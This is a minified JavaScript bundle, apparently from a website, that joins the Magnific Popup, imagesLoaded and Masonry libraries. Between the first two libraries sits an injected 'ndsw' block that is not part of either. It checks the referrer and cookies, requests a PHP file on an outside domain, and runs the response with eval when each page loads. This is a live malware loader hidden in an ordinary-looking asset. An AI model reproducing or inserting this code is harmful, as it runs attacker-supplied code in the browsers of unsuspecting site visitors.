            a ? n.st.showCloseBtn && n.st.closeBtnInside && n.currTemplate[b] === !0 ? n.content.find(".mfp-close").length || n.content.append(B()) : n.content = a : n.content = "",
            z(e),
            n.container.addClass("mfp-" + b + "-holder"),
            n.contentContainer.append(n.content)
        },
        parseEl: function(b) {
            var c = n.items[b]
              , d = c.type;
            c.tagName ? c = {
                el: a(c)
            } : c = {
                data: c,
                src: c.src
            };
            if (c.el) {
                var e = n.types;
                for (var f = 0; f < e.length; f++)
                    if (c.el.hasClass("mfp-" + e[f])) {
                        d = e[f];
                        break
                    }
                c.src = c.el.attr("data-mfp-src"),
                c.src || (c.src = c.el.attr("href"))
            }
            return c.type = d || n.st.type || "inline",
            c.index = b,
            c.parsed = !0,
            n.items[b] = c,
            z("ElementParse", c),
            n.items[b]
        },
        addGroup: function(a, b) {
            var c = function(c) {
                c.mfpEl = this,
                n._openClick(c, a, b)
            };
            b || (b = {});
            var d = "click.magnificPopup";
            b.mainEl = a,
            b.items ? (b.isObj = !0,
            a.off(d).on(d, c)) : (b.isObj = !1,
            b.delegate ? a.off(d).on(d, b.delegate, c) : (b.items = a,
            a.off(d).on(d, c)))
        },
        _openClick: function(b, c, d) {
            var e = d.midClick !== undefined ? d.midClick : a.magnificPopup.defaults.midClick;
            if (!e && (b.which === 2 || b.ctrlKey || b.metaKey))
                return;
            var f = d.disableOn !== undefined ? d.disableOn : a.magnificPopup.defaults.disableOn;
            if (f)
                if (a.isFunction(f)) {
                    if (!f.call(n))
                        return !0
                } else if (r.width() < f)
                    return !0;
            b.type && (b.preventDefault(),
            n.isOpen && b.stopPropagation()),
            d.el = a(b.mfpEl),
            d.delegate && (d.items = c.find(d.delegate)),
            n.open(d)
        },
        updateStatus: function(a, b) {
            if (n.preloader) {
                q !== a && n.container.removeClass("mfp-s-" + q),
                !b && a === "loading" && (b = n.st.tLoading);
                var c = {
                    status: a,
                    text: b
                };
                z("UpdateStatus", c),
                a = c.status,
                b = c.text,
                n.preloader.html(b),
                n.preloader.find("a").on("click", function(a) {
                    a.stopImmediatePropagation()
                }),
                n.container.addClass("mfp-s-" + a),
                q = a
            }
        },
        _checkIfClose: function(b) {
            if (a(b).hasClass(m))
                return;
            var c = n.st.closeOnContentClick
              , d = n.st.closeOnBgClick;
            if (c && d)
                return !0;
            if (!n.content || a(b).hasClass("mfp-close") || n.preloader && b === n.preloader[0])
                return !0;
            if (b !== n.content[0] && !a.contains(n.content[0], b)) {
                if (d && a.contains(document, b))
                    return !0
            } else if (c)
                return !0;
            return !1
        },
        _addClassToMFP: function(a) {
            n.bgOverlay.addClass(a),
            n.wrap.addClass(a)
        },
        _removeClassFromMFP: function(a) {
            this.bgOverlay.removeClass(a),
            n.wrap.removeClass(a)
        },
        _hasScrollBar: function(a) {
            return (n.isIE7 ? t.height() : document.body.scrollHeight) > (a || r.height())
        },
        _parseMarkup: function(b, c, d) {
            var e;
            d.data && (c = a.extend(d.data, c)),
            z(f, [b, c, d]),
            a.each(c, function(a, c) {
                if (c === undefined || c === !1)
                    return !0;
                e = a.split("_");
                if (e.length > 1) {
                    var d = b.find(j + "-" + e[0]);
                    if (d.length > 0) {
                        var f = e[1];
                        f === "replaceWith" ? d[0] !== c[0] && d.replaceWith(c) : f === "img" ? d.is("img") ? d.attr("src", c) : d.replaceWith('<img src="' + c + '" class="' + d.attr("class") + '" />') : d.attr(e[1], c)
                    }
                } else
                    b.find(j + "-" + a).html(c)
            })
        },
        _getScrollbarSize: function() {
            if (n.scrollbarSize === undefined) {
                var a = document.createElement("div");
                a.id = "mfp-sbm",
                a.style.cssText = "width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;",
                document.body.appendChild(a),
                n.scrollbarSize = a.offsetWidth - a.clientWidth,
                document.body.removeChild(a)
            }
            return n.scrollbarSize
        }
    },
    a.magnificPopup = {
        instance: null,
        proto: o.prototype,
        modules: [],
        open: function(b, c) {
            return C(),
            b ? b = a.extend(!0, {}, b) : b = {},
            b.isObj = !0,
            b.index = c || 0,
            this.instance.open(b)
        },
        close: function() {
            return a.magnificPopup.instance && a.magnificPopup.instance.close()
        },
        registerModule: function(b, c) {
            c.options && (a.magnificPopup.defaults[b] = c.options),
            a.extend(this.proto, c.proto),
            this.modules.push(b)
        },
        defaults: {
            disableOn: 0,
            key: null,
            midClick: !1,
            mainClass: "",
            preloader: !0,
            focus: "",
            closeOnContentClick: !1,
            closeOnBgClick: !0,
            closeBtnInside: !0,
            showCloseBtn: !0,
            enableEscapeKey: !0,
            modal: !1,
            alignTop: !1,
            removalDelay: 0,
            fixedContentPos: "auto",
            fixedBgPos: "auto",
            overflowY: "auto",
            closeMarkup: '<button title="%title%" type="button" class="mfp-close">&times;</button>',
            tClose: "Close (Esc)",
            tLoading: "Loading..."
        }
    },
    a.fn.magnificPopup = function(b) {
        C();
        var c = a(this);
        if (typeof b == "string")
            if (b === "open") {
                var d, e = p ? c.data("magnificPopup") : c[0].magnificPopup, f = parseInt(arguments[1], 10) || 0;
                e.items ? d = e.items[f] : (d = c,
                e.delegate && (d = d.find(e.delegate)),
                d = d.eq(f)),
                n._openClick({
                    mfpEl: d
                }, c, e)
            } else
                n.isOpen && n[b].apply(n, Array.prototype.slice.call(arguments, 1));
        else
            b = a.extend(!0, {}, b),
            p ? c.data("magnificPopup", b) : c[0].magnificPopup = b,
            n.addGroup(c, b);
        return c
    }
    ;
    var E, F = function(b) {
        if (b.data && b.data.title !== undefined)
            return b.data.title;
        var c = n.st.image.titleSrc;
        if (c) {
            if (a.isFunction(c))
                return c.call(n, b);
            if (b.el)
                return b.el.attr(c) || ""
        }
        return ""
    };
    a.magnificPopup.registerModule("image", {
        options: {
            markup: '<div class="mfp-figure"><div class="mfp-close"></div><figure><div class="mfp-img"></div><figcaption><div class="mfp-bottom-bar"><div class="mfp-title"></div><div class="mfp-counter"></div></div></figcaption></figure></div>',
            cursor: "mfp-zoom-out-cur",
            titleSrc: "title",
            verticalFit: !0,
            tError: '<a href="%url%">The image</a> could not be loaded.'
        },
        proto: {
            initImage: function() {
                var a = n.st.image
                  , c = ".image";
                n.types.push("image"),
                x(g + c, function() {
                    n.currItem.type === "image" && a.cursor && s.addClass(a.cursor)
                }),
                x(b + c, function() {
                    a.cursor && s.removeClass(a.cursor),
                    r.off("resize" + j)
                }),
                x("Resize" + c, n.resizeImage),
                n.isLowIE && x("AfterChange", n.resizeImage)
            },
            resizeImage: function() {
                var a = n.currItem;
                if (!a || !a.img)
                    return;
                if (n.st.image.verticalFit) {
                    var b = 0;
                    n.isLowIE && (b = parseInt(a.img.css("padding-top"), 10) + parseInt(a.img.css("padding-bottom"), 10)),
                    a.img.css("max-height", n.wH - b)
                }
            },
            _onImageHasSize: function(a) {
                a.img && (a.hasSize = !0,
                E && clearInterval(E),
                a.isCheckingImgSize = !1,
                z("ImageHasSize", a),
                a.imgHidden && (n.content && n.content.removeClass("mfp-loading"),
                a.imgHidden = !1))
            },
            findImageSize: function(a) {
                var b = 0
                  , c = a.img[0]
                  , d = function(e) {
                    E && clearInterval(E),
                    E = setInterval(function() {
                        if (c.naturalWidth > 0) {
                            n._onImageHasSize(a);
                            return
                        }
                        b > 200 && clearInterval(E),
                        b++,
                        b === 3 ? d(10) : b === 40 ? d(50) : b === 100 && d(500)
                    }, e)
                };
                d(1)
            },
            getImage: function(b, c) {
                var d = 0
                  , e = function() {
                    b && (b.img[0].complete ? (b.img.off(".mfploader"),
                    b === n.currItem && (n._onImageHasSize(b),
                    n.updateStatus("ready")),
                    b.hasSize = !0,
                    b.loaded = !0,
                    z("ImageLoadComplete")) : (d++,
                    d < 200 ? setTimeout(e, 100) : f()))
                }
                  , f = function() {
                    b && (b.img.off(".mfploader"),
                    b === n.currItem && (n._onImageHasSize(b),
                    n.updateStatus("error", g.tError.replace("%url%", b.src))),
                    b.hasSize = !0,
                    b.loaded = !0,
                    b.loadError = !0)
                }
                  , g = n.st.image
                  , h = c.find(".mfp-img");
                if (h.length) {
                    var i = document.createElement("img");
                    i.className = "mfp-img",
                    b.img = a(i).on("load.mfploader", e).on("error.mfploader", f),
                    i.src = b.src,
                    h.is("img") && (b.img = b.img.clone()),
                    b.img[0].naturalWidth > 0 && (b.hasSize = !0)
                }
                return n._parseMarkup(c, {
                    title: F(b),
                    img_replaceWith: b.img
                }, b),
                n.resizeImage(),
                b.hasSize ? (E && clearInterval(E),
                b.loadError ? (c.addClass("mfp-loading"),
                n.updateStatus("error", g.tError.replace("%url%", b.src))) : (c.removeClass("mfp-loading"),
                n.updateStatus("ready")),
                c) : (n.updateStatus("loading"),
                b.loading = !0,
                b.hasSize || (b.imgHidden = !0,
                c.addClass("mfp-loading"),
                n.findImageSize(b)),
                c)
            }
        }
    });
    var G, H = function() {
        return G === undefined && (G = document.createElement("p").style.MozTransform !== undefined),
        G
    };
    a.magnificPopup.registerModule("zoom", {
        options: {
            enabled: !1,
            easing: "ease-in-out",
            duration: 300,
            opener: function(a) {
                return a.is("img") ? a : a.find("img")
            }
        },
        proto: {
            initZoom: function() {
                var a = n.st.zoom, d = ".zoom", e;
                if (!a.enabled || !n.supportsTransition)
                    return;
                var f = a.duration, g = function(b) {
                    var c = b.clone().removeAttr("style").removeAttr("class").addClass("mfp-animated-image")
                      , d = "all " + a.duration / 1e3 + "s " + a.easing
                      , e = {
                        position: "fixed",
                        zIndex: 9999,
                        left: 0,
                        top: 0,
                        "-webkit-backface-visibility": "hidden"
                    }
                      , f = "transition";
                    return e["-webkit-" + f] = e["-moz-" + f] = e["-o-" + f] = e[f] = d,
                    c.css(e),
                    c
                }, h = function() {
                    n.content.css("visibility", "visible")
                }, i, j;
                x("BuildControls" + d, function() {
                    if (n._allowZoom()) {
                        clearTimeout(i),
                        n.content.css("visibility", "hidden"),
                        e = n._getItemToZoom();
                        if (!e) {
                            h();
                            return
                        }
                        j = g(e),
                        j.css(n._getOffset()),
                        n.wrap.append(j),
                        i = setTimeout(function() {
                            j.css(n._getOffset(!0)),
                            i = setTimeout(function() {
                                h(),
                                setTimeout(function() {
                                    j.remove(),
                                    e = j = null,
                                    z("ZoomAnimationEnded")
                                }, 16)
                            }, f)
                        }, 16)
                    }
                }),
                x(c + d, function() {
                    if (n._allowZoom()) {
                        clearTimeout(i),
                        n.st.removalDelay = f;
                        if (!e) {
                            e = n._getItemToZoom();
                            if (!e)
                                return;
                            j = g(e)
                        }
                        j.css(n._getOffset(!0)),
                        n.wrap.append(j),
                        n.content.css("visibility", "hidden"),
                        setTimeout(function() {
                            j.css(n._getOffset())
                        }, 16)
                    }
                }),
                x(b + d, function() {
                    n._allowZoom() && (h(),
                    j && j.remove(),
                    e = null)
                })
            },
            _allowZoom: function() {
                return n.currItem.type === "image"
            },
            _getItemToZoom: function() {
                return n.currItem.hasSize ? n.currItem.img : !1
            },
            _getOffset: function(b) {
                var c;
                b ? c = n.currItem.img : c = n.st.zoom.opener(n.currItem.el || n.currItem);
                var d = c.offset()
                  , e = parseInt(c.css("padding-top"), 10)
                  , f = parseInt(c.css("padding-bottom"), 10);
                d.top -= a(window).scrollTop() - e;
                var g = {
                    width: c.width(),
                    height: (p ? c.innerHeight() : c[0].offsetHeight) - f - e
                };
                return H() ? g["-moz-transform"] = g.transform = "translate(" + d.left + "px," + d.top + "px)" : (g.left = d.left,
                g.top = d.top),
                g
            }
        }
    });
    var I = "retina";
    a.magnificPopup.registerModule(I, {
        options: {
            replaceSrc: function(a) {
                return a.src.replace(/\.\w+$/, function(a) {
                    return "@2x" + a
                })
            },
            ratio: 1
        },
        proto: {
            initRetina: function() {
                if (window.devicePixelRatio > 1) {
                    var a = n.st.retina
                      , b = a.ratio;
                    b = isNaN(b) ? b() : b,
                    b > 1 && (x("ImageHasSize." + I, function(a, c) {
                        c.img.css({
                            "max-width": c.img[0].naturalWidth / b,
                            width: "100%"
                        })
                    }),
                    x("ElementParse." + I, function(c, d) {
                        d.src = a.replaceSrc(d, b)
                    }))
                }
            }
        }
    })
}
)(window.jQuery || window.Zepto);
if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/*! This file is auto-generated */
/*!
 * imagesLoaded PACKAGED v4.1.4
 * JavaScript is all like "You images are done yet or what?"
 * MIT License
 */

!function(e, t) {
    "function" == typeof define && define.amd ? define("ev-emitter/ev-emitter", t) : "object" == typeof module && module.exports ? module.exports = t() : e.EvEmitter = t()
}("undefined" != typeof window ? window : this, function() {
    function e() {}
    var t = e.prototype;
    return t.on = function(e, t) {
        if (e && t) {
            var i = this._events = this._events || {}
              , n = i[e] = i[e] || [];
            return n.indexOf(t) == -1 && n.push(t),
            this
        }
    }
    ,
    t.once = function(e, t) {
        if (e && t) {
            this.on(e, t);
            var i = this._onceEvents = this._onceEvents || {}
              , n = i[e] = i[e] || {};
            return n[t] = !0,
            this
        }
    }
    ,
    t.off = function(e, t) {
        var i = this._events && this._events[e];
        if (i && i.length) {
            var n = i.indexOf(t);
            return n != -1 && i.splice(n, 1),
            this
        }
    }
    ,
    t.emitEvent = function(e, t) {
        var i = this._events && this._events[e];
        if (i && i.length) {
            i = i.slice(0),
            t = t || [];
            for (var n = this._onceEvents && this._onceEvents[e], o = 0; o < i.length; o++) {
                var r = i[o]
                  , s = n && n[r];
                s && (this.off(e, r),
                delete n[r]),
                r.apply(this, t)
            }
            return this
        }
    }
    ,
    t.allOff = function() {
        delete this._events,
        delete this._onceEvents
    }
    ,
    e
}),
function(e, t) {
    "use strict";
    "function" == typeof define && define.amd ? define(["ev-emitter/ev-emitter"], function(i) {
        return t(e, i)
    }) : "object" == typeof module && module.exports ? module.exports = t(e, require("ev-emitter")) : e.imagesLoaded = t(e, e.EvEmitter)
}("undefined" != typeof window ? window : this, function(e, t) {
    function i(e, t) {
        for (var i in t)
            e[i] = t[i];
        return e
    }
    function n(e) {
        if (Array.isArray(e))
            return e;
        var t = "object" == typeof e && "number" == typeof e.length;
        return t ? d.call(e) : [e]
    }
    function o(e, t, r) {
        if (!(this instanceof o))
            return new o(e,t,r);
        var s = e;
        return "string" == typeof e && (s = document.querySelectorAll(e)),
        s ? (this.elements = n(s),
        this.options = i({}, this.options),
        "function" == typeof t ? r = t : i(this.options, t),
        r && this.on("always", r),
        this.getImages(),
        h && (this.jqDeferred = new h.Deferred),
        void setTimeout(this.check.bind(this))) : void a.error("Bad element for imagesLoaded " + (s || e))
    }
    function r(e) {
        this.img = e
    }
    function s(e, t) {
        this.url = e,
        this.element = t,
        this.img = new Image
    }
    var h = e.jQuery
      , a = e.console
      , d = Array.prototype.slice;
    o.prototype = Object.create(t.prototype),
    o.prototype.options = {},
    o.prototype.getImages = function() {
        this.images = [],
        this.elements.forEach(this.addElementImages, this)
    }
    ,
    o.prototype.addElementImages = function(e) {
        "IMG" == e.nodeName && this.addImage(e),
        this.options.background === !0 && this.addElementBackgroundImages(e);
        var t = e.nodeType;
        if (t && u[t]) {
            for (var i = e.querySelectorAll("img"), n = 0; n < i.length; n++) {
                var o = i[n];
                this.addImage(o)
            }
            if ("string" == typeof this.options.background) {
                var r = e.querySelectorAll(this.options.background);
                for (n = 0; n < r.length; n++) {
                    var s = r[n];
                    this.addElementBackgroundImages(s)
                }
            }
        }
    }
    ;
    var u = {
        1: !0,
        9: !0,
        11: !0
    };
    return o.prototype.addElementBackgroundImages = function(e) {
        var t = getComputedStyle(e);
        if (t)
            for (var i = /url\((['"])?(.*?)\1\)/gi, n = i.exec(t.backgroundImage); null !== n; ) {
                var o = n && n[2];
                o && this.addBackground(o, e),
                n = i.exec(t.backgroundImage)
            }
    }
    ,
    o.prototype.addImage = function(e) {
        var t = new r(e);
        this.images.push(t)
    }
    ,
    o.prototype.addBackground = function(e, t) {
        var i = new s(e,t);
        this.images.push(i)
    }
    ,
    o.prototype.check = function() {
        function e(e, i, n) {
            setTimeout(function() {
                t.progress(e, i, n)
            })
        }
        var t = this;
        return this.progressedCount = 0,
        this.hasAnyBroken = !1,
        this.images.length ? void this.images.forEach(function(t) {
            t.once("progress", e),
            t.check()
        }) : void this.complete()
    }
    ,
    o.prototype.progress = function(e, t, i) {
        this.progressedCount++,
        this.hasAnyBroken = this.hasAnyBroken || !e.isLoaded,
        this.emitEvent("progress", [this, e, t]),
        this.jqDeferred && this.jqDeferred.notify && this.jqDeferred.notify(this, e),
        this.progressedCount == this.images.length && this.complete(),
        this.options.debug && a && a.log("progress: " + i, e, t)
    }
    ,
    o.prototype.complete = function() {
        var e = this.hasAnyBroken ? "fail" : "done";
        if (this.isComplete = !0,
        this.emitEvent(e, [this]),
        this.emitEvent("always", [this]),
        this.jqDeferred) {
            var t = this.hasAnyBroken ? "reject" : "resolve";
            this.jqDeferred[t](this)
        }
    }
    ,
    r.prototype = Object.create(t.prototype),
    r.prototype.check = function() {
        var e = this.getIsImageComplete();
        return e ? void this.confirm(0 !== this.img.naturalWidth, "naturalWidth") : (this.proxyImage = new Image,
        this.proxyImage.addEventListener("load", this),
        this.proxyImage.addEventListener("error", this),
        this.img.addEventListener("load", this),
        this.img.addEventListener("error", this),
        void (this.proxyImage.src = this.img.src))
    }
    ,
    r.prototype.getIsImageComplete = function() {
        return this.img.complete && this.img.naturalWidth
    }
    ,
    r.prototype.confirm = function(e, t) {
        this.isLoaded = e,
        this.emitEvent("progress", [this, this.img, t])
    }
    ,
    r.prototype.handleEvent = function(e) {
        var t = "on" + e.type;
        this[t] && this[t](e)
    }
    ,
    r.prototype.onload = function() {
        this.confirm(!0, "onload"),
        this.unbindEvents()
    }
    ,
    r.prototype.onerror = function() {
        this.confirm(!1, "onerror"),
        this.unbindEvents()
    }
    ,
    r.prototype.unbindEvents = function() {
        this.proxyImage.removeEventListener("load", this),
        this.proxyImage.removeEventListener("error", this),
        this.img.removeEventListener("load", this),
        this.img.removeEventListener("error", this)
    }
    ,
    s.prototype = Object.create(r.prototype),
    s.prototype.check = function() {
        this.img.addEventListener("load", this),
        this.img.addEventListener("error", this),
        this.img.src = this.url;
        var e = this.getIsImageComplete();
        e && (this.confirm(0 !== this.img.naturalWidth, "naturalWidth"),
        this.unbindEvents())
    }
    ,
    s.prototype.unbindEvents = function() {
        this.img.removeEventListener("load", this),
        this.img.removeEventListener("error", this)
    }
    ,
    s.prototype.confirm = function(e, t) {
        this.isLoaded = e,
        this.emitEvent("progress", [this, this.element, t])
    }
    ,
    o.makeJQueryPlugin = function(t) {
        t = t || e.jQuery,
        t && (h = t,
        h.fn.imagesLoaded = function(e, t) {
            var i = new o(this,e,t);
            return i.jqDeferred.promise(h(this))
        }
        )
    }
    ,
    o.makeJQueryPlugin(),
    o
});
;/*! This file is auto-generated */
/*!
 * Masonry PACKAGED v4.2.2
 * Cascading grid layout library
 * https://masonry.desandro.com
 * MIT License
 * by David DeSandro
 */

!function(t, e) {
    "function" == typeof define && define.amd ? define("jquery-bridget/jquery-bridget", ["jquery"], function(i) {
        return e(t, i)
    }) : "object" == typeof module && module.exports ? module.exports = e(t, require("jquery")) : t.jQueryBridget = e(t, t.jQuery)
}(window, function(t, e) {
    "use strict";
    function i(i, r, a) {
        function h(t, e, n) {
            var o, r = "$()." + i + '("' + e + '")';
            return t.each(function(t, h) {
                var u = a.data(h, i);
                if (!u)
                    return void s(i + " not initialized. Cannot call methods, i.e. " + r);
                var d = u[e];
                if (!d || "_" == e.charAt(0))
                    return void s(r + " is not a valid method");
                var l = d.apply(u, n);
                o = void 0 === o ? l : o
            }),
            void 0 !== o ? o : t
        }
        function u(t, e) {
            t.each(function(t, n) {
                var o = a.data(n, i);
                o ? (o.option(e),
                o._init()) : (o = new r(n,e),
                a.data(n, i, o))
            })
        }
        a = a || e || t.jQuery,
        a && (r.prototype.option || (r.prototype.option = function(t) {
            a.isPlainObject(t) && (this.options = a.extend(!0, this.options, t))
        }
        ),
        a.fn[i] = function(t) {
            if ("string" == typeof t) {
                var e = o.call(arguments, 1);
                return h(this, t, e)
            }
            return u(this, t),
            this
        }
        ,
        n(a))
    }
    function n(t) {
        !t || t && t.bridget || (t.bridget = i)
    }
    var o = Array.prototype.slice
      , r = t.console
      , s = "undefined" == typeof r ? function() {}
    : function(t) {
        r.error(t)
    }
    ;
    return n(e || t.jQuery),
    i
}),
function(t, e) {
    "function" == typeof define && define.amd ? define("ev-emitter/ev-emitter", e) : "object" == typeof module && module.exports ? module.exports = e() : t.EvEmitter = e()
}("undefined" != typeof window ? window : this, function() {
    function t() {}
    var e = t.prototype;
    return e.on = function(t, e) {
        if (t && e) {
            var i = this._events = this._events || {}
              , n = i[t] = i[t] || [];
            return -1 == n.indexOf(e) && n.push(e),
            this
        }
    }
    ,
    e.once = function(t, e) {
        if (t && e) {
            this.on(t, e);
            var i = this._onceEvents = this._onceEvents || {}
              , n = i[t] = i[t] || {};
            return n[e] = !0,
            this
        }
    }
    ,
    e.off = function(t, e) {
        var i = this._events && this._events[t];
        if (i && i.length) {
            var n = i.indexOf(e);
            return -1 != n && i.splice(n, 1),
            this
        }
    }
    ,
    e.emitEvent = function(t, e) {
        var i = this._events && this._events[t];
        if (i && i.length) {
            i = i.slice(0),
            e = e || [];
            for (var n = this._onceEvents && this._onceEvents[t], o = 0; o < i.length; o++) {
                var r = i[o]
                  , s = n && n[r];
                s && (this.off(t, r),
                delete n[r]),
                r.apply(this, e)
            }
            return this
        }
    }
    ,
    e.allOff = function() {
        delete this._events,
        delete this._onceEvents
    }
    ,
    t
}),
function(t, e) {
    "function" == typeof define && define.amd ? define("get-size/get-size", e) : "object" == typeof module && module.exports ? module.exports = e() : t.getSize = e()
}(window, function() {
    "use strict";
    function t(t) {
        var e = parseFloat(t)
          , i = -1 == t.indexOf("%") && !isNaN(e);
        return i && e
    }
    function e() {}
    function i() {
        for (var t = {
            width: 0,
            height: 0,
            innerWidth: 0,
            innerHeight: 0,
            outerWidth: 0,
            outerHeight: 0
        }, e = 0; u > e; e++) {
            var i = h[e];
            t[i] = 0
        }
        return t
    }
    function n(t) {
        var e = getComputedStyle(t);
        return e || a("Style returned " + e + ". Are you running this code in a hidden iframe on Firefox? See https://bit.ly/getsizebug1"),
        e
    }
    function o() {
        if (!d) {
            d = !0;
            var e = document.createElement("div");
            e.style.width = "200px",
            e.style.padding = "1px 2px 3px 4px",
            e.style.borderStyle = "solid",
            e.style.borderWidth = "1px 2px 3px 4px",
            e.style.boxSizing = "border-box";
            var i = document.body || document.documentElement;
            i.appendChild(e);
            var o = n(e);
            s = 200 == Math.round(t(o.width)),
            r.isBoxSizeOuter = s,
            i.removeChild(e)
        }
    }
    function r(e) {
        if (o(),
        "string" == typeof e && (e = document.querySelector(e)),
        e && "object" == typeof e && e.nodeType) {
            var r = n(e);
            if ("none" == r.display)
                return i();
            var a = {};
            a.width = e.offsetWidth,
            a.height = e.offsetHeight;
            for (var d = a.isBorderBox = "border-box" == r.boxSizing, l = 0; u > l; l++) {
                var c = h[l]
                  , f = r[c]
                  , m = parseFloat(f);
                a[c] = isNaN(m) ? 0 : m
            }
            var p = a.paddingLeft + a.paddingRight
              , g = a.paddingTop + a.paddingBottom
              , y = a.marginLeft + a.marginRight
              , v = a.marginTop + a.marginBottom
              , _ = a.borderLeftWidth + a.borderRightWidth
              , z = a.borderTopWidth + a.borderBottomWidth
              , E = d && s
              , b = t(r.width);
            b !== !1 && (a.width = b + (E ? 0 : p + _));
            var x = t(r.height);
            return x !== !1 && (a.height = x + (E ? 0 : g + z)),
            a.innerWidth = a.width - (p + _),
            a.innerHeight = a.height - (g + z),
            a.outerWidth = a.width + y,
            a.outerHeight = a.height + v,
            a
        }
    }
    var s, a = "undefined" == typeof console ? e : function(t) {
        console.error(t)
    }
    , h = ["paddingLeft", "paddingRight", "paddingTop", "paddingBottom", "marginLeft", "marginRight", "marginTop", "marginBottom", "borderLeftWidth", "borderRightWidth", "borderTopWidth", "borderBottomWidth"], u = h.length, d = !1;
    return r
}),
function(t, e) {
    "use strict";
    "function" == typeof define && define.amd ? define("desandro-matches-selector/matches-selector", e) : "object" == typeof module && module.exports ? module.exports = e() : t.matchesSelector = e()
}(window, function() {
    "use strict";
    var t = function() {
        var t = window.Element.prototype;
        if (t.matches)
            return "matches";
        if (t.matchesSelector)
            return "matchesSelector";
        for (var e = ["webkit", "moz", "ms", "o"], i = 0; i < e.length; i++) {
            var n = e[i]
              , o = n + "MatchesSelector";
            if (t[o])
                return o
        }
    }();
    return function(e, i) {
        return e[t](i)
    }
}),
function(t, e) {
    "function" == typeof define && define.amd ? define("fizzy-ui-utils/utils", ["desandro-matches-selector/matches-selector"], function(i) {
        return e(t, i)
    }) : "object" == typeof module && module.exports ? module.exports = e(t, require("desandro-matches-selector")) : t.fizzyUIUtils = e(t, t.matchesSelector)
}(window, function(t, e) {
    var i = {};
    i.extend = function(t, e) {
        for (var i in e)
            t[i] = e[i];
        return t
    }
    ,
    i.modulo = function(t, e) {
        return (t % e + e) % e
    }
    ;
    var n = Array.prototype.slice;
    i.makeArray = function(t) {
        if (Array.isArray(t))
            return t;
        if (null === t || void 0 === t)
            return [];
        var e = "object" == typeof t && "number" == typeof t.length;
        return e ? n.call(t) : [t]
    }
    ,
    i.removeFrom = function(t, e) {
        var i = t.indexOf(e);
        -1 != i && t.splice(i, 1)
    }
    ,
    i.getParent = function(t, i) {
        for (; t.parentNode && t != document.body; )
            if (t = t.parentNode,
            e(t, i))
                return t
    }
    ,
    i.getQueryElement = function(t) {
        return "string" == typeof t ? document.querySelector(t) : t
    }
    ,
    i.handleEvent = function(t) {
        var e = "on" + t.type;
        this[e] && this[e](t)
    }
    ,
    i.filterFindElements = function(t, n) {
        t = i.makeArray(t);
        var o = [];
        return t.forEach(function(t) {
            if (t instanceof HTMLElement) {
                if (!n)
                    return void o.push(t);
                e(t, n) && o.push(t);
                for (var i = t.querySelectorAll(n), r = 0; r < i.length; r++)
                    o.push(i[r])
            }
        }),
        o
    }
    ,
    i.debounceMethod = function(t, e, i) {
        i = i || 100;
        var n = t.prototype[e]
          , o = e + "Timeout";
        t.prototype[e] = function() {
            var t = this[o];
            clearTimeout(t);
            var e = arguments
              , r = this;
            this[o] = setTimeout(function() {
                n.apply(r, e),
                delete r[o]
            }, i)
        }
    }
    ,
    i.docReady = function(t) {
        var e = document.readyState;
        "complete" == e || "interactive" == e ? setTimeout(t) : document.addEventListener("DOMContentLoaded", t)
    }
    ,
    i.toDashed = function(t) {
        return t.replace(/(.)([A-Z])/g, function(t, e, i) {
            return e + "-" + i
        }).toLowerCase()
    }
    ;
    var o = t.console;
    return i.htmlInit = function(e, n) {
        i.docReady(function() {
            var r = i.toDashed(n)
              , s = "data-" + r
              , a = document.querySelectorAll("[" + s + "]")
              , h = document.querySelectorAll(".js-" + r)
              , u = i.makeArray(a).concat(i.makeArray(h))
              , d = s + "-options"
              , l = t.jQuery;
            u.forEach(function(t) {
                var i, r = t.getAttribute(s) || t.getAttribute(d);
                try {
                    i = r && JSON.parse(r)
                } catch (a) {
                    return void (o && o.error("Error parsing " + s + " on " + t.className + ": " + a))
                }
                var h = new e(t,i);
                l && l.data(t, n, h)
            })
        })
    }
    ,
    i
}),
function(t, e) {
    "function" == typeof define && define.amd ? define("outlayer/item", ["ev-emitter/ev-emitter", "get-size/get-size"], e) : "object" == typeof module && module.exports ? module.exports = e(require("ev-emitter"), require("get-size")) : (t.Outlayer = {},
    t.Outlayer.Item = e(t.EvEmitter, t.getSize))
}(window, function(t, e) {
    "use strict";
    function i(t) {
        for (var e in t)
            return !1;
        return e = null,
        !0
    }
    function n(t, e) {
        t && (this.element = t,
        this.layout = e,
        this.position = {
            x: 0,
            y: 0
        },
        this._create())
    }
    function o(t) {
        return t.replace(/([A-Z])/g, function(t) {
            return "-" + t.toLowerCase()
        })
    }
    var r = document.documentElement.style
      , s = "string" == typeof r.transition ? "transition" : "WebkitTransition"
      , a = "string" == typeof r.transform ? "transform" : "WebkitTransform"
      , h = {
        WebkitTransition: "webkitTransitionEnd",
        transition: "transitionend"
    }[s]
      , u = {
        transform: a,
        transition: s,
        transitionDuration: s + "Duration",
        transitionProperty: s + "Property",
        transitionDelay: s + "Delay"
    }
      , d = n.prototype = Object.create(t.prototype);
    d.constructor = n,
    d._create = function() {
        this._transn = {
            ingProperties: {},
            clean: {},
            onEnd: {}
        },
        this.css({
            position: "absolute"
        })
    }
    ,
    d.handleEvent = function(t) {
        var e = "on" + t.type;
        this[e] && this[e](t)
    }
    ,
    d.getSize = function() {
        this.size = e(this.element)
    }
    ,
    d.css = function(t) {
        var e = this.element.style;
        for (var i in t) {
            var n = u[i] || i;
            e[n] = t[i]
        }
    }
    ,
    d.getPosition = function() {
        var t = getComputedStyle(this.element)
          , e = this.layout._getOption("originLeft")
          , i = this.layout._getOption("originTop")
          , n = t[e ? "left" : "right"]
          , o = t[i ? "top" : "bottom"]
          , r = parseFloat(n)
          , s = parseFloat(o)
